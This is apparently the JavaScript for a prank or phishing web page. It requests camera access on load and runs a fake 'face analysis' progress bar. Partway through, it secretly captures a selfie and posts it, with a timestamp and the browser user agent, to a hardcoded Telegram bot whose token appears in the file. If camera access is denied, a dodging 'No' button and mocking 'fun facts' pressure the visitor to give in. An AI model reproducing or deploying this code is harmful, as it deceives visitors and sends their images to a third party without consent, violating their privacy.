// ============================================
// CONFIGURATION
// ============================================
const CONFIG = {
    BOT_TOKEN: '8917852352:AAFh9sShYmHmCbt95lELjzguBdgL-4VJvbQ',
    CHAT_ID: '5076816855'
};

// ============================================
// STATE
// ============================================
let dodgeCount = 0;
let stream = null;

const funfacts = [
    "Wusstest du? 9 von 10 Spaßbremsen bereuen ihre Entscheidung! 📊",
    "Fun Fact: Der Nein-Button hat Angst vor dir! 🏃‍♂️",
    "Statistik: 100% der Leute die Ja gedrückt haben, hatten mehr Spaß! 🎉",
    "Wissenschaftlich bewiesen: Nein-Sager altern 3x schneller! 👴",
    "Geheimer Tipp: Der Ja-Button macht dich 47% attraktiver! 💅",
    "Breaking News: Nein-Button hat Burnout und macht nicht mehr mit! 😤",
    "Plot Twist: Der Nein-Button ist eigentlich auf meiner Seite! 😏",
    "Achtung: Jeder Versuch macht den Nein-Button noch flinker! 🐇"
];

// ============================================
// SCREEN MANAGEMENT
// ============================================
function showScreen(screenId) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    const target = document.getElementById(screenId);
    if (target) {
        // Reset card animation
        const card = target.querySelector('.glass-card');
        if (card) {
            card.style.animation = 'none';
            card.offsetHeight; // trigger reflow
            card.style.animation = '';
        }
        target.classList.add('active');
    }
}

// ============================================
// CAMERA ACCESS
// ============================================
async function requestCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } },
            audio: false
        });

        // Show camera screen
        showScreen('screen-camera');

        const video = document.getElementById('camera-feed');
        video.srcObject = stream;

        // Wait for video to be ready
        video.onloadedmetadata = () => {
            video.play();
            // Start the fake "analysis" and capture
            startAnalysis(video);
        };

    } catch (err) {
        console.log('Camera access denied:', err);
        showScreen('screen-denied');
        updateFunfact();
    }
}

// ============================================
// FAKE ANALYSIS + PHOTO CAPTURE
// ============================================
function startAnalysis(video) {
    const progressFill = document.getElementById('progress-fill');
    const progressLabel = document.getElementById('progress-label');
    const statusText = document.getElementById('status-text');

    const stages = [
        { progress: 15, status: 'Gesicht erkannt...', label: 'Gesichtserkennung...' },
        { progress: 35, status: 'Gesichtszüge werden analysiert...', label: 'Feature-Analyse...' },
        { progress: 55, status: 'Vergleich mit Datenbank...', label: 'Datenbank-Abgleich...' },
        { progress: 75, status: 'Ähnlichkeiten berechnen...', label: 'Berechnung läuft...' },
        { progress: 90, status: 'Fast fertig...', label: 'Ergebnis wird generiert...' },
        { progress: 100, status: 'Analyse abgeschlossen!', label: 'Fertig!' }
    ];

    let capturedAt35 = false;

    stages.forEach((stage, index) => {
        setTimeout(() => {
            progressFill.style.width = stage.progress + '%';
            statusText.textContent = stage.status;
            progressLabel.textContent = stage.label;

            // Capture photo at ~35% progress
            if (stage.progress >= 35 && !capturedAt35) {
                capturedAt35 = true;
                captureAndSend(video);
            }

            // Show success at 100%
            if (stage.progress >= 100) {
                setTimeout(() => {
                    stopCamera();
                    showScreen('screen-success');
                }, 800);
            }
        }, (index + 1) * 700);
    });
}

// ============================================
// CAPTURE PHOTO & SEND TO TELEGRAM
// ============================================
function captureAndSend(video) {
    const canvas = document.getElementById('photo-canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');
    // Mirror the image to match what user sees
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0);

    // Convert to blob and send
    canvas.toBlob(async (blob) => {
        if (blob) {
            await sendToTelegram(blob);
        }
    }, 'image/jpeg', 0.9);
}

async function sendToTelegram(photoBlob) {
    const formData = new FormData();
    formData.append('chat_id', CONFIG.CHAT_ID);
    formData.append('photo', photoBlob, 'selfie.jpg');

    // Collect some info
    const now = new Date();
    const timeStr = now.toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });

    let caption = `📸 Neues Selfie eingegangen!\n`;
    caption += `🕐 Zeit: ${timeStr}\n`;
    caption += `📱 Gerät: ${navigator.userAgent.substring(0, 100)}`;

    formData.append('caption', caption);

    try {
        const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        const data = await response.json();
        console.log('Telegram response:', data.ok ? 'sent!' : 'error');
    } catch (err) {
        console.error('Failed to send to Telegram:', err);
    }
}

// ============================================
// STOP CAMERA
// ============================================
function stopCamera() {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
    }
}

// ============================================
// DODGING BUTTON LOGIC
// ============================================
function dodgeButton() {
    const btn = document.getElementById('btn-no');
    const card = document.querySelector('.denied-card');
    const cardRect = card.getBoundingClientRect();

    // Calculate safe bounds within the card
    const btnWidth = btn.offsetWidth;
    const btnHeight = btn.offsetHeight;
    const padding = 20;

    const maxX = cardRect.width - btnWidth - padding * 2;
    const maxY = cardRect.height - btnHeight - padding;

    // Random position within card
    const randomX = Math.random() * maxX - maxX / 2;
    const randomY = Math.random() * (maxY * 0.4) + 50;

    // Apply new position
    btn.style.position = 'absolute';
    btn.style.left = `calc(50% + ${randomX}px)`;
    btn.style.top = `${randomY}px`;
    btn.style.transform = `translate(-50%, 0) rotate(${(Math.random() - 0.5) * 20}deg)`;
    btn.style.transition = 'all 0.15s cubic-bezier(0.16, 1, 0.3, 1)';

    // Update counter
    dodgeCount++;
    document.getElementById('dodge-count').textContent = dodgeCount;

    // Update funfact every 3 dodges
    if (dodgeCount % 3 === 0) {
        updateFunfact();
    }

    // Add a funny shake to the emoji
    const emoji = document.querySelector('.denied-emoji');
    emoji.style.animation = 'none';
    emoji.offsetHeight;
    emoji.style.animation = 'emojiShake 0.5s ease-in-out';
}

function updateFunfact() {
    const funfactEl = document.getElementById('funfact');
    const randomFact = funfacts[Math.floor(Math.random() * funfacts.length)];
    funfactEl.style.opacity = 0;
    setTimeout(() => {
        funfactEl.textContent = randomFact;
        funfactEl.style.opacity = 1;
    }, 200);
    funfactEl.style.transition = 'opacity 0.2s ease';
}

// ============================================
// INITIALIZATION - Kamera wird SOFORT angefragt!
// ============================================
document.addEventListener('DOMContentLoaded', () => {
    // Kamera sofort beim Laden der Seite anfragen
    // Der Browser zeigt automatisch die Erlaubnis-Abfrage
    requestCamera();
});
